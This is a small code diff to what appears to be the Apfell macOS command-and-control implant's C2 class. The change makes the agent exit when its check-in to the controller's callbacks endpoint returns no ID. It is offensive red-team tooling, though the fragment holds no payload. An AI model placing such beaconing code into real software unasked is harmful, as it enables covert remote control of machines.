@@ -25,6 +25,8 @@ class customC2 extends baseC2{
 		//calls htmlPostData(url,data) to actually checkin
 		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));
 		apfell.id = jsondata.id;
+		// if we fail to get a new ID number, then exit the application
+		if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
 		return jsondata;
 	}
 	getTasking(){
